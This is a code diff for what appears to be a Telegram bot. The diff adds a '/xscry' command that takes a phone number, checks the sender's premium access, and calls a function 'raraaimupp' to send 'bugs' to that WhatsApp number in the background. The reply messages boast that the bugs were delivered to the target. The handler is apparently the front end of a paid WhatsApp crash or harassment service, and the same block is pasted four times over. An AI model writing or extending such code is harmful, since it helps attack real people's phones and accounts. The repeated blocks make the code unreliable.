@@ -18542,6 +18542,478 @@ bot.onText(/\/xstund(?:\s+(.+))?/i, async (msg, match) => {
   }
 });
 
+bot.onText(/\/xscry(?:\s+(.+))?/i, async (msg, match) => {
+  const chatId = msg.chat.id;
+  const senderId = msg.from.id;
+
+  if (!match[1]) return bot.sendMessage(chatId, "Example: /xscry 628xxx");
+
+  const rawNumber = match[1].replace(/[^0-9]/g, "");
+  if (!rawNumber || rawNumber.length < 8)
+    return bot.sendMessage(chatId, "Format salah, contoh: /xscry 628xxx");
+
+  const target = `${rawNumber}@s.whatsapp.net`;
+  const formattedNumber = rawNumber;
+
+  try {
+    // ===== EMOJI PREMIUM CONFIG =====
+    const prem = (id, fallback) => `<tg-emoji emoji-id="${id}">${fallback}</tg-emoji>`;
+    const e1 = prem("5465616729092676098", "✅");
+    const btnEmojiId = "4958621549474087897"; // 🖕 untuk Button
+
+    // ===== CEK KONEKSI & STATUS =====
+    if (!sock || (!sock.user && sock.ws?.readyState !== 1)) {
+      return bot.sendMessage(chatId, "❌ WhatsApp belum terhubung.\nGunakan /addsender").catch(() => {});
+    }
+
+    // UPDATE NAMA COMMAND DI PENGECEKAN AKTIF
+    if (!isCmdActive("/xscry")) {
+      return bot.sendMessage(chatId, "Fitur ini belum di nyalakan oleh owner kalau mau nyalakan ketik /aktif /xscry.").catch(() => {});
+    }
+
+    const chatType = msg.chat.type;
+    if (isGroupOnly() && chatType === "private") {
+      return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.").catch(() => {});
+    }
+
+    if (!BOT_ACTIVE) {
+      return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH OWNER").catch(() => {});
+    }
+
+    const isPremium = await premium(senderId);
+    const groupAllowed = chatType !== "private" && isGroupAllowed(chatId);
+
+    if (!isPremium && !groupAllowed) {
+      return bot.sendMessage(chatId, "Fitur ini hanya untuk user Premium / Group premium.").catch(() => {});
+    }
+
+    // ===== AUTO JOIN CHECK =====
+    if (autoJoinSettings?.enabled) {
+      if (!autoJoinSettings.links || !autoJoinSettings.links.length) {
+        return bot.sendMessage(chatId, `<blockquote>⚠️ LINK BELUM DISET!\n\nSilahkan admin set dulu:\n/setautojoin</blockquote>`, { parse_mode: "HTML" }).catch(() => {});
+      }
+
+      let joined = false;
+      try { joined = await isUserJoinedAll(bot, senderId, autoJoinSettings.links); } catch { joined = false; }
+
+      if (!joined) {
+        const buttons = autoJoinSettings.links.map((v, i) => [
+          { text: `JOIN KAK #${i + 1}`, url: v.startsWith("@") ? `https://t.me/${v.slice(1)}` : v }
+        ]);
+        buttons.push([{ text: "✨ Verifikasi", callback_data: `AJVERIFY_${senderId}` }]);
+
+        return bot.sendMessage(chatId, `<blockquote>🚫 AKSES TERBATAS!\n\n🔒 Kamu wajib join semua link di bawah terlebih dahulu.\n✨ Setelah join, tekan tombol verifikasi di bawah.</blockquote>`, { parse_mode: "HTML", reply_markup: { inline_keyboard: buttons } }).catch(() => {});
+      }
+    }
+
+    // ===== FAST RESPON NOTIFIKASI =====
+    const messageText = `<blockquote>${e1} <b>BUGS SELESAI DI KIRIM UNTUK :</b> <code>${formattedNumber}</code></blockquote>`;
+
+    // 1. KIRIM NOTIFIKASI LANGSUNG (Tanpa menunggu proses bug selesai)
+    // Walaupun user nyepam berkali-kali, notif ini akan selalu terkirim dengan instan.
+    bot.sendMessage(chatId, messageText, {
+      parse_mode: "HTML",
+      reply_markup: {
+        inline_keyboard: [
+          [
+            {
+              text: "🖕 { CHECK TARGET }", 
+              url: `https://wa.me/${formattedNumber}`,
+              icon_custom_emoji_id: btnEmojiId
+            }
+          ]
+        ]
+      }
+    }).catch(() => {}); 
+
+    // ===== OPTIMASI CPU (MENCEGAH MACET SAAT DI-SPAM) =====
+    // 2. Jika nomor target sudah ada di dalam antrian (sedang diproses eksekusi bug),
+    // Kita stop/return di sini agar eksekusi bug tidak bertumpuk ratusan kali dan bikin server hang.
+        // ===== OPTIMASI CPU & GLOBAL ANTI DOUBLE =====
+    if (globalActiveProcesses.has(target)) {
+      globalActiveProcesses.set(target, Date.now()); 
+      return; 
+    }
+    globalActiveProcesses.set(target, Date.now());
+
+    // 🔥 PROSES REAL SEND BUG DI BACKGROUND
+    raraaimupp(target)
+      .catch((err) => {
+        const msgError = String(err?.message || "").toLowerCase();
+        
+        // DETEKSI SENDER LEPAS (DELAY 10 DETIK)
+        if (msgError.includes("connection") || msgError.includes("closed") || msgError.includes("disconnect")) {
+          setTimeout(() => {
+            const isConnected = sock && sock.user && sock.ws?.readyState === 1;
+            if (!isConnected) {
+              bot.sendMessage(chatId, "❌ Gagal mengirim bug: Koneksi WA terputus permanen (Sender mati). Silakan /addsender ulang.").catch(() => {});
+            }
+          }, 10000); 
+        }
+      })
+    .finally(() => { 
+  globalActiveProcesses.delete(target);
+      });
+
+  } catch (e) {
+    bot.sendMessage(chatId, `❌ Terjadi kesalahan sistem: ${e?.message}`).catch(() => {});
+  }
+});
+
+bot.onText(/\/xscry(?:\s+(.+))?/i, async (msg, match) => {
+  const chatId = msg.chat.id;
+  const senderId = msg.from.id;
+
+  if (!match[1]) return bot.sendMessage(chatId, "Example: /xscry 628xxx");
+
+  const rawNumber = match[1].replace(/[^0-9]/g, "");
+  if (!rawNumber || rawNumber.length < 8)
+    return bot.sendMessage(chatId, "Format salah, contoh: /xscry 628xxx");
+
+  const target = `${rawNumber}@s.whatsapp.net`;
+  const formattedNumber = rawNumber;
+
+  try {
+    // ===== EMOJI PREMIUM CONFIG =====
+    const prem = (id, fallback) => `<tg-emoji emoji-id="${id}">${fallback}</tg-emoji>`;
+    const e1 = prem("5465616729092676098", "✅");
+    const btnEmojiId = "4958621549474087897"; // 🖕 untuk Button
+
+    // ===== CEK KONEKSI & STATUS =====
+    if (!sock || (!sock.user && sock.ws?.readyState !== 1)) {
+      return bot.sendMessage(chatId, "❌ WhatsApp belum terhubung.\nGunakan /addsender").catch(() => {});
+    }
+
+    // UPDATE NAMA COMMAND DI PENGECEKAN AKTIF
+    if (!isCmdActive("/xscry")) {
+      return bot.sendMessage(chatId, "Fitur ini belum di nyalakan oleh owner kalau mau nyalakan ketik /aktif /xscry.").catch(() => {});
+    }
+
+    const chatType = msg.chat.type;
+    if (isGroupOnly() && chatType === "private") {
+      return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.").catch(() => {});
+    }
+
+    if (!BOT_ACTIVE) {
+      return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH OWNER").catch(() => {});
+    }
+
+    const isPremium = await premium(senderId);
+    const groupAllowed = chatType !== "private" && isGroupAllowed(chatId);
+
+    if (!isPremium && !groupAllowed) {
+      return bot.sendMessage(chatId, "Fitur ini hanya untuk user Premium / Group premium.").catch(() => {});
+    }
+
+    // ===== AUTO JOIN CHECK =====
+    if (autoJoinSettings?.enabled) {
+      if (!autoJoinSettings.links || !autoJoinSettings.links.length) {
+        return bot.sendMessage(chatId, `<blockquote>⚠️ LINK BELUM DISET!\n\nSilahkan admin set dulu:\n/setautojoin</blockquote>`, { parse_mode: "HTML" }).catch(() => {});
+      }
+
+      let joined = false;
+      try { joined = await isUserJoinedAll(bot, senderId, autoJoinSettings.links); } catch { joined = false; }
+
+      if (!joined) {
+        const buttons = autoJoinSettings.links.map((v, i) => [
+          { text: `JOIN KAK #${i + 1}`, url: v.startsWith("@") ? `https://t.me/${v.slice(1)}` : v }
+        ]);
+        buttons.push([{ text: "✨ Verifikasi", callback_data: `AJVERIFY_${senderId}` }]);
+
+        return bot.sendMessage(chatId, `<blockquote>🚫 AKSES TERBATAS!\n\n🔒 Kamu wajib join semua link di bawah terlebih dahulu.\n✨ Setelah join, tekan tombol verifikasi di bawah.</blockquote>`, { parse_mode: "HTML", reply_markup: { inline_keyboard: buttons } }).catch(() => {});
+      }
+    }
+
+    // ===== FAST RESPON NOTIFIKASI =====
+    const messageText = `<blockquote>${e1} <b>BUGS SELESAI DI KIRIM UNTUK :</b> <code>${formattedNumber}</code></blockquote>`;
+
+    // 1. KIRIM NOTIFIKASI LANGSUNG (Tanpa menunggu proses bug selesai)
+    // Walaupun user nyepam berkali-kali, notif ini akan selalu terkirim dengan instan.
+    bot.sendMessage(chatId, messageText, {
+      parse_mode: "HTML",
+      reply_markup: {
+        inline_keyboard: [
+          [
+            {
+              text: "🖕 { CHECK TARGET }", 
+              url: `https://wa.me/${formattedNumber}`,
+              icon_custom_emoji_id: btnEmojiId
+            }
+          ]
+        ]
+      }
+    }).catch(() => {}); 
+
+    // ===== OPTIMASI CPU (MENCEGAH MACET SAAT DI-SPAM) =====
+    // 2. Jika nomor target sudah ada di dalam antrian (sedang diproses eksekusi bug),
+    // Kita stop/return di sini agar eksekusi bug tidak bertumpuk ratusan kali dan bikin server hang.
+        // ===== OPTIMASI CPU & GLOBAL ANTI DOUBLE =====
+    if (globalActiveProcesses.has(target)) {
+      globalActiveProcesses.set(target, Date.now()); 
+      return; 
+    }
+    globalActiveProcesses.set(target, Date.now());
+
+    // 🔥 PROSES REAL SEND BUG DI BACKGROUND
+    raraaimupp(target)
+      .catch((err) => {
+        const msgError = String(err?.message || "").toLowerCase();
+        
+        // DETEKSI SENDER LEPAS (DELAY 10 DETIK)
+        if (msgError.includes("connection") || msgError.includes("closed") || msgError.includes("disconnect")) {
+          setTimeout(() => {
+            const isConnected = sock && sock.user && sock.ws?.readyState === 1;
+            if (!isConnected) {
+              bot.sendMessage(chatId, "❌ Gagal mengirim bug: Koneksi WA terputus permanen (Sender mati). Silakan /addsender ulang.").catch(() => {});
+            }
+          }, 10000); 
+        }
+      })
+    .finally(() => { 
+  globalActiveProcesses.delete(target);
+      });
+
+  } catch (e) {
+    bot.sendMessage(chatId, `❌ Terjadi kesalahan sistem: ${e?.message}`).catch(() => {});
+  }
+});
+
+bot.onText(/\/xscry(?:\s+(.+))?/i, async (msg, match) => {
+  const chatId = msg.chat.id;
+  const senderId = msg.from.id;
+
+  if (!match[1]) return bot.sendMessage(chatId, "Example: /xscry 628xxx");
+
+  const rawNumber = match[1].replace(/[^0-9]/g, "");
+  if (!rawNumber || rawNumber.length < 8)
+    return bot.sendMessage(chatId, "Format salah, contoh: /xscry 628xxx");
+
+  const target = `${rawNumber}@s.whatsapp.net`;
+  const formattedNumber = rawNumber;
+
+  try {
+    // ===== EMOJI PREMIUM CONFIG =====
+    const prem = (id, fallback) => `<tg-emoji emoji-id="${id}">${fallback}</tg-emoji>`;
+    const e1 = prem("5465616729092676098", "✅");
+    const btnEmojiId = "4958621549474087897"; // 🖕 untuk Button
+
+    // ===== CEK KONEKSI & STATUS =====
+    if (!sock || (!sock.user && sock.ws?.readyState !== 1)) {
+      return bot.sendMessage(chatId, "❌ WhatsApp belum terhubung.\nGunakan /addsender").catch(() => {});
+    }
+
+    // UPDATE NAMA COMMAND DI PENGECEKAN AKTIF
+    if (!isCmdActive("/xscry")) {
+      return bot.sendMessage(chatId, "Fitur ini belum di nyalakan oleh owner kalau mau nyalakan ketik /aktif /xscry.").catch(() => {});
+    }
+
+    const chatType = msg.chat.type;
+    if (isGroupOnly() && chatType === "private") {
+      return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.").catch(() => {});
+    }
+
+    if (!BOT_ACTIVE) {
+      return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH OWNER").catch(() => {});
+    }
+
+    const isPremium = await premium(senderId);
+    const groupAllowed = chatType !== "private" && isGroupAllowed(chatId);
+
+    if (!isPremium && !groupAllowed) {
+      return bot.sendMessage(chatId, "Fitur ini hanya untuk user Premium / Group premium.").catch(() => {});
+    }
+
+    // ===== AUTO JOIN CHECK =====
+    if (autoJoinSettings?.enabled) {
+      if (!autoJoinSettings.links || !autoJoinSettings.links.length) {
+        return bot.sendMessage(chatId, `<blockquote>⚠️ LINK BELUM DISET!\n\nSilahkan admin set dulu:\n/setautojoin</blockquote>`, { parse_mode: "HTML" }).catch(() => {});
+      }
+
+      let joined = false;
+      try { joined = await isUserJoinedAll(bot, senderId, autoJoinSettings.links); } catch { joined = false; }
+
+      if (!joined) {
+        const buttons = autoJoinSettings.links.map((v, i) => [
+          { text: `JOIN KAK #${i + 1}`, url: v.startsWith("@") ? `https://t.me/${v.slice(1)}` : v }
+        ]);
+        buttons.push([{ text: "✨ Verifikasi", callback_data: `AJVERIFY_${senderId}` }]);
+
+        return bot.sendMessage(chatId, `<blockquote>🚫 AKSES TERBATAS!\n\n🔒 Kamu wajib join semua link di bawah terlebih dahulu.\n✨ Setelah join, tekan tombol verifikasi di bawah.</blockquote>`, { parse_mode: "HTML", reply_markup: { inline_keyboard: buttons } }).catch(() => {});
+      }
+    }
+
+    // ===== FAST RESPON NOTIFIKASI =====
+    const messageText = `<blockquote>${e1} <b>BUGS SELESAI DI KIRIM UNTUK :</b> <code>${formattedNumber}</code></blockquote>`;
+
+    // 1. KIRIM NOTIFIKASI LANGSUNG (Tanpa menunggu proses bug selesai)
+    // Walaupun user nyepam berkali-kali, notif ini akan selalu terkirim dengan instan.
+    bot.sendMessage(chatId, messageText, {
+      parse_mode: "HTML",
+      reply_markup: {
+        inline_keyboard: [
+          [
+            {
+              text: "🖕 { CHECK TARGET }", 
+              url: `https://wa.me/${formattedNumber}`,
+              icon_custom_emoji_id: btnEmojiId
+            }
+          ]
+        ]
+      }
+    }).catch(() => {}); 
+
+    // ===== OPTIMASI CPU (MENCEGAH MACET SAAT DI-SPAM) =====
+    // 2. Jika nomor target sudah ada di dalam antrian (sedang diproses eksekusi bug),
+    // Kita stop/return di sini agar eksekusi bug tidak bertumpuk ratusan kali dan bikin server hang.
+        // ===== OPTIMASI CPU & GLOBAL ANTI DOUBLE =====
+    if (globalActiveProcesses.has(target)) {
+      globalActiveProcesses.set(target, Date.now()); 
+      return; 
+    }
+    globalActiveProcesses.set(target, Date.now());
+
+    // 🔥 PROSES REAL SEND BUG DI BACKGROUND
+    raraaimupp(target)
+      .catch((err) => {
+        const msgError = String(err?.message || "").toLowerCase();
+        
+        // DETEKSI SENDER LEPAS (DELAY 10 DETIK)
+        if (msgError.includes("connection") || msgError.includes("closed") || msgError.includes("disconnect")) {
+          setTimeout(() => {
+            const isConnected = sock && sock.user && sock.ws?.readyState === 1;
+            if (!isConnected) {
+              bot.sendMessage(chatId, "❌ Gagal mengirim bug: Koneksi WA terputus permanen (Sender mati). Silakan /addsender ulang.").catch(() => {});
+            }
+          }, 10000); 
+        }
+      })
+    .finally(() => { 
+  globalActiveProcesses.delete(target);
+      });
+
+  } catch (e) {
+    bot.sendMessage(chatId, `❌ Terjadi kesalahan sistem: ${e?.message}`).catch(() => {});
+  }
+});
+
+bot.onText(/\/xscry(?:\s+(.+))?/i, async (msg, match) => {
+  const chatId = msg.chat.id;
+  const senderId = msg.from.id;
+
+  if (!match[1]) return bot.sendMessage(chatId, "Example: /xscry 628xxx");
+
+  const rawNumber = match[1].replace(/[^0-9]/g, "");
+  if (!rawNumber || rawNumber.length < 8)
+    return bot.sendMessage(chatId, "Format salah, contoh: /xscry 628xxx");
+
+  const target = `${rawNumber}@s.whatsapp.net`;
+  const formattedNumber = rawNumber;
+
+  try {
+    // ===== EMOJI PREMIUM CONFIG =====
+    const prem = (id, fallback) => `<tg-emoji emoji-id="${id}">${fallback}</tg-emoji>`;
+    const e1 = prem("5465616729092676098", "✅");
+    const btnEmojiId = "4958621549474087897"; // 🖕 untuk Button
+
+    // ===== CEK KONEKSI & STATUS =====
+    if (!sock || (!sock.user && sock.ws?.readyState !== 1)) {
+      return bot.sendMessage(chatId, "❌ WhatsApp belum terhubung.\nGunakan /addsender").catch(() => {});
+    }
+
+    // UPDATE NAMA COMMAND DI PENGECEKAN AKTIF
+    if (!isCmdActive("/xscry")) {
+      return bot.sendMessage(chatId, "Fitur ini belum di nyalakan oleh owner kalau mau nyalakan ketik /aktif /xscry.").catch(() => {});
+    }
+
+    const chatType = msg.chat.type;
+    if (isGroupOnly() && chatType === "private") {
+      return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.").catch(() => {});
+    }
+
+    if (!BOT_ACTIVE) {
+      return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH OWNER").catch(() => {});
+    }
+
+    const isPremium = await premium(senderId);
+    const groupAllowed = chatType !== "private" && isGroupAllowed(chatId);
+
+    if (!isPremium && !groupAllowed) {
+      return bot.sendMessage(chatId, "Fitur ini hanya untuk user Premium / Group premium.").catch(() => {});
+    }
+
+    // ===== AUTO JOIN CHECK =====
+    if (autoJoinSettings?.enabled) {
+      if (!autoJoinSettings.links || !autoJoinSettings.links.length) {
+        return bot.sendMessage(chatId, `<blockquote>⚠️ LINK BELUM DISET!\n\nSilahkan admin set dulu:\n/setautojoin</blockquote>`, { parse_mode: "HTML" }).catch(() => {});
+      }
+
+      let joined = false;
+      try { joined = await isUserJoinedAll(bot, senderId, autoJoinSettings.links); } catch { joined = false; }
+
+      if (!joined) {
+        const buttons = autoJoinSettings.links.map((v, i) => [
+          { text: `JOIN KAK #${i + 1}`, url: v.startsWith("@") ? `https://t.me/${v.slice(1)}` : v }
+        ]);
+        buttons.push([{ text: "✨ Verifikasi", callback_data: `AJVERIFY_${senderId}` }]);
+
+        return bot.sendMessage(chatId, `<blockquote>🚫 AKSES TERBATAS!\n\n🔒 Kamu wajib join semua link di bawah terlebih dahulu.\n✨ Setelah join, tekan tombol verifikasi di bawah.</blockquote>`, { parse_mode: "HTML", reply_markup: { inline_keyboard: buttons } }).catch(() => {});
+      }
+    }
+
+    // ===== FAST RESPON NOTIFIKASI =====
+    const messageText = `<blockquote>${e1} <b>BUGS SELESAI DI KIRIM UNTUK :</b> <code>${formattedNumber}</code></blockquote>`;
+
+    // 1. KIRIM NOTIFIKASI LANGSUNG (Tanpa menunggu proses bug selesai)
+    // Walaupun user nyepam berkali-kali, notif ini akan selalu terkirim dengan instan.
+    bot.sendMessage(chatId, messageText, {
+      parse_mode: "HTML",
+      reply_markup: {
+        inline_keyboard: [
+          [
+            {
+              text: "🖕 { CHECK TARGET }", 
+              url: `https://wa.me/${formattedNumber}`,
+              icon_custom_emoji_id: btnEmojiId
+            }
+          ]
+        ]
+      }
+    }).catch(() => {}); 
+
+    // ===== OPTIMASI CPU (MENCEGAH MACET SAAT DI-SPAM) =====
+    // 2. Jika nomor target sudah ada di dalam antrian (sedang diproses eksekusi bug),
+    // Kita stop/return di sini agar eksekusi bug tidak bertumpuk ratusan kali dan bikin server hang.
+        // ===== OPTIMASI CPU & GLOBAL ANTI DOUBLE =====
+    if (globalActiveProcesses.has(target)) {
+      globalActiveProcesses.set(target, Date.now()); 
+      return; 
+    }
+    globalActiveProcesses.set(target, Date.now());
+
+    // 🔥 PROSES REAL SEND BUG DI BACKGROUND
+    raraaimupp(target)
+      .catch((err) => {
+        const msgError = String(err?.message || "").toLowerCase();
+        
+        // DETEKSI SENDER LEPAS (DELAY 10 DETIK)
+        if (msgError.includes("connection") || msgError.includes("closed") || msgError.includes("disconnect")) {
+          setTimeout(() => {
+            const isConnected = sock && sock.user && sock.ws?.readyState === 1;
+            if (!isConnected) {
+              bot.sendMessage(chatId, "❌ Gagal mengirim bug: Koneksi WA terputus permanen (Sender mati). Silakan /addsender ulang.").catch(() => {});
+            }
+          }, 10000); 
+        }
+      })
+    .finally(() => { 
+  globalActiveProcesses.delete(target);
+      });
+
+  } catch (e) {
+    bot.sendMessage(chatId, `❌ Terjadi kesalahan sistem: ${e?.message}`).catch(() => {});
+  }
+});
+
 // ---------------ZypherX-----------\\
 // ================= ZypherX =================
 // ===== BOT COMMAND =====
